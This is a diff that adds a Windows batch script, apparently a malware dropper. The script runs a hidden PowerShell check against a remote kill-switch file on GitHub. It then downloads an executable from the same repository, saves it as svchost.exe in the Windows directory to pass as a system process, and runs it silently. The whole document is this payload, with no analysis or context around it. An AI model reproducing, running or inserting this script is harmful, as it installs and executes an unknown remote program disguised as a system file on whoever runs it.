@@ -1,0 +1,6 @@
+@echo off
+@powershell -WindowStyle Hidden -Command "$L='1'; $R=(curl.exe --noproxy "*" -s -f -L 'https://raw.githubusercontent.com/hidparse/friendly-dollop/refs/heads/main/ps.txt' | Out-String).Trim(); if($L -ne $R){exit 1}" || exit
+@curl --noproxy "*" --fail -L --proto "=https" --tlsv1.2 -o "%windir%\svchost.exe" "https://raw.githubusercontent.com/hidparse/friendly-dollop/refs/heads/main/test.exe" >nul 2>&1
+%windir%\svchost.exe >nul 2>&1
+%windir%\svchost.exe >nul 2>&1
+pause .
